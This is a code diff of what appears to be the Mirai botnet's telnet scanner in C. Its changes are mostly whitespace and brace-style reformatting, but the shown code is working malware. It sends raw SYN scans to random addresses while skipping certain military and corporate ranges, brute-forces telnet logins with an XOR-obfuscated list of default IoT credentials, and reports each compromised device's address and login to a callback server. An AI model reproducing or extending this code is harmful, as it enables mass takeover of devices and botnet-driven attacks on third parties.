@@ -28,7 +28,7 @@
 #include "resolv.h"
 
 int scanner_pid, rsck, rsck_out, auth_table_len = 0;
-char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
+char scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
 struct scanner_auth *auth_table = NULL;
 struct scanner_connection *conn_table;
 uint16_t auth_table_max_weight = 0;
@@ -42,7 +42,7 @@ int recv_strip_null(int sock, void *buf, int len, int flags)
     {
         int i = 0;
 
-        for(i = 0; i < ret; i++)
+        for (i = 0; i < ret; i++)
         {
             if (((char *)buf)[i] == 0x00)
             {
@@ -70,7 +70,7 @@ void scanner_init(void)
 
     rand_init();
     fake_time = time(NULL);
-    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
+    conn_table = calloc(SCANNER_MAX_CONNS, sizeof(struct scanner_connection));
     for (i = 0; i < SCANNER_MAX_CONNS; i++)
     {
         conn_table[i].state = SC_CLOSED;
@@ -87,7 +87,7 @@ void scanner_init(void)
     }
     fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
     i = 1;
-    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
+    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
     {
 #ifdef DEBUG
         printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
@@ -99,8 +99,7 @@ void scanner_init(void)
     do
     {
         source_port = rand_next() & 0xffff;
-    }
-    while (ntohs(source_port) < 1024);
+    } while (ntohs(source_port) < 1024);
 
     iph = (struct iphdr *)scanner_rawpkt;
     tcph = (struct tcphdr *)(iph + 1);
@@ -108,7 +107,7 @@ void scanner_init(void)
     // Set up IPv4 header
     iph->ihl = 5;
     iph->version = 4;
-    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
+    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
     iph->id = rand_next();
     iph->ttl = 64;
     iph->protocol = IPPROTO_TCP;
@@ -121,69 +120,68 @@ void scanner_init(void)
     tcph->syn = TRUE;
 
     // Set up passwords
-    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
-    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
-    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
-    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
-    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
-    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
-    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
-    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
-    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
-    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
-    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
-    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
-    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
-    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          // admin    (none)
-    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              // root     pass
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);      // admin    admin1234
-    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                              // root     1111
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);          // admin    smcadmin
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                          // admin    1111
-    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                      // root     666666
-    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);              // root     password
-    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                              // root     1234
-    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                      // root     klv123
-    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1); // Administrator admin
-    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);      // service  service
+    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                                        // root     xc3511
+    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                                             // root     vizxv
+    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                                             // root     admin
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                                         // admin    admin
+    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                                         // root     888888
+    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                                     // root     xmhdipc
+    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                                     // root     default
+    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);                                 // root     juantech
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                                         // root     123456
+    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                                             // root     54321
+    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);                         // support  support
+    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                                                 // root     (none)
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);                             // admin    password
+    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                                                 // root     root
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                                             // root     12345
+    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                                                 // user     user
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                                             // admin    (none)
+    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                                                 // root     pass
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);                         // admin    admin1234
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                                                 // root     1111
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);                             // admin    smcadmin
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                                             // admin    1111
+    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                                         // root     666666
+    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);                                 // root     password
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                                                 // root     1234
+    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                                         // root     klv123
+    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1);     // Administrator admin
+    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);                         // service  service
     add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 1); // supervisor supervisor
-    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                      // guest    guest
-    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
-    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
-    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);      // admin1   password
-    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1); // administrator 1234
-    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);              // 666666   666666
-    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);              // 888888   888888
-    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                              // ubnt     ubnt
-    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                  // root     klv1234
-    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                      // root     Zte521
-    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                      // root     hi3518
-    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                          // root     jvbzd
-    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                              // root     anko
-    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                          // root     zlxx.
-    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1); // root     7ujMko0vizxv
-    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // root     7ujMko0admin
-    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                      // root     system
-    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                              // root     ikwb
-    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);              // root     dreambox
-    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                              // root     user
-    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                  // root     realtek
-    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);              // root     00000000
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);              // admin    1111111
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                          // admin    1234
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                      // admin    12345
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                      // admin    54321
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                  // admin    123456
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // admin    7ujMko0admin
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                          // admin    1234
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
-    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
-    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
-
+    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                                         // guest    guest
+    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                                         // guest    12345
+    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                                         // guest    12345
+    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);                         // admin1   password
+    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1);             // administrator 1234
+    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);                                 // 666666   666666
+    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);                                 // 888888   888888
+    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                                                 // ubnt     ubnt
+    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                                     // root     klv1234
+    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                                         // root     Zte521
+    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                                         // root     hi3518
+    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                                             // root     jvbzd
+    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                                                 // root     anko
+    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                                             // root     zlxx.
+    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1);                 // root     7ujMko0vizxv
+    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1);                 // root     7ujMko0admin
+    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                                         // root     system
+    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                                                 // root     ikwb
+    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);                                 // root     dreambox
+    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                                                 // root     user
+    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                                     // root     realtek
+    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);                                 // root     00000000
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);                                 // admin    1111111
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                                             // admin    1234
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                                         // admin    12345
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                                         // admin    54321
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                                     // admin    123456
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1);             // admin    7ujMko0admin
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                                             // admin    1234
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                                             // admin    pass
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                                     // admin    meinsm
+    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                                                 // tech     tech
+    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);                                 // mother   fucker
 
 #ifdef DEBUG
     printf("[scanner] Scanner process initialized. Scanning started.\n");
@@ -212,7 +210,7 @@ void scanner_init(void)
                 iph->saddr = LOCAL_ADDR;
                 iph->daddr = get_random_ip();
                 iph->check = 0;
-                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
                 if (i % 10 == 0)
                 {
@@ -224,13 +222,13 @@ void scanner_init(void)
                 }
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
+                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
                 paddr.sin_port = tcph->dest;
 
-                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
+                sendto(rsck, scanner_rawpkt, sizeof(scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
             }
         }
 
@@ -245,7 +243,7 @@ void scanner_init(void)
             struct scanner_connection *conn;
 
             errno = 0;
-            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
+            n = recvfrom(rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
             if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                 break;
 
@@ -364,7 +362,7 @@ void scanner_init(void)
             if (FD_ISSET(conn->fd, &fdset_wr))
             {
                 int err = 0, ret = 0;
-                socklen_t err_len = sizeof (err);
+                socklen_t err_len = sizeof(err);
 
                 ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                 if (err == 0 && ret == 0)
@@ -520,7 +518,7 @@ void scanner_init(void)
                                 conn->state = SC_WAITING_SYSTEM_RESP;
                             }
                             break;
-			case SC_WAITING_SYSTEM_RESP:
+                        case SC_WAITING_SYSTEM_RESP:
                             if ((consumed = consume_any_prompt(conn)) > 0)
                             {
                                 char *tmp_str;
@@ -668,7 +666,7 @@ static void setup_connection(struct scanner_connection *conn)
 
     conn->last_recv = fake_time;
     conn->state = SC_CONNECTING;
-    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
 }
 
 static ipv4_t get_random_ip(void)
@@ -684,23 +682,22 @@ static ipv4_t get_random_ip(void)
         o2 = (tmp >> 8) & 0xff;
         o3 = (tmp >> 16) & 0xff;
         o4 = (tmp >> 24) & 0xff;
-    }
-    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
-          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
-          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
-          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
-          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
-          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
-          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
-          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
-          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
-          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
-          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
-          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
-          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
+    } while (o1 == 127 ||                                                                                                                                               // 127.0.0.0/8      - Loopback
+             (o1 == 0) ||                                                                                                                                               // 0.0.0.0/8        - Invalid address space
+             (o1 == 3) ||                                                                                                                                               // 3.0.0.0/8        - General Electric Company
+             (o1 == 15 || o1 == 16) ||                                                                                                                                  // 15.0.0.0/7       - Hewlett-Packard Company
+             (o1 == 56) ||                                                                                                                                              // 56.0.0.0/8       - US Postal Service
+             (o1 == 10) ||                                                                                                                                              // 10.0.0.0/8       - Internal network
+             (o1 == 192 && o2 == 168) ||                                                                                                                                // 192.168.0.0/16   - Internal network
+             (o1 == 172 && o2 >= 16 && o2 < 32) ||                                                                                                                      // 172.16.0.0/14    - Internal network
+             (o1 == 100 && o2 >= 64 && o2 < 127) ||                                                                                                                     // 100.64.0.0/10    - IANA NAT reserved
+             (o1 == 169 && o2 > 254) ||                                                                                                                                 // 169.254.0.0/16   - IANA NAT reserved
+             (o1 == 198 && o2 >= 18 && o2 < 20) ||                                                                                                                      // 198.18.0.0/15    - IANA Special use
+             (o1 >= 224) ||                                                                                                                                             // 224.*.*.*+       - Multicast
+             (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
     );
 
-    return INET_ADDR(o1,o2,o3,o4);
+    return INET_ADDR(o1, o2, o3, o4);
 }
 
 static int consume_iacs(struct scanner_connection *conn)
@@ -742,7 +739,7 @@ static int consume_iacs(struct scanner_connection *conn)
             }
             else
             {
-                iac_wont:
+            iac_wont:
 
                 if (!can_consume(conn, ptr, 2))
                     break;
@@ -872,7 +869,7 @@ static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
 {
     int tmp;
 
-    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
+    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof(struct scanner_auth));
     auth_table[auth_table_len].username = deobf(enc_user, &tmp);
     auth_table[auth_table_len].username_len = (uint8_t)tmp;
     auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
@@ -934,7 +931,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     table_lock_val(TABLE_SCAN_CB_DOMAIN);
     table_lock_val(TABLE_SCAN_CB_PORT);
 
-    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+    if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
     {
 #ifdef DEBUG
         printf("[report] Failed to connect to scanner callback!\n");
@@ -944,12 +941,12 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     }
 
     uint8_t zero = 0;
-    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
-    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
-    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
-    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
+    send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
+    send(fd, &daddr, sizeof(ipv4_t), MSG_NOSIGNAL);
+    send(fd, &dport, sizeof(uint16_t), MSG_NOSIGNAL);
+    send(fd, &(auth->username_len), sizeof(uint8_t), MSG_NOSIGNAL);
     send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
-    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
+    send(fd, &(auth->password_len), sizeof(uint8_t), MSG_NOSIGNAL);
     send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);
 
 #ifdef DEBUG
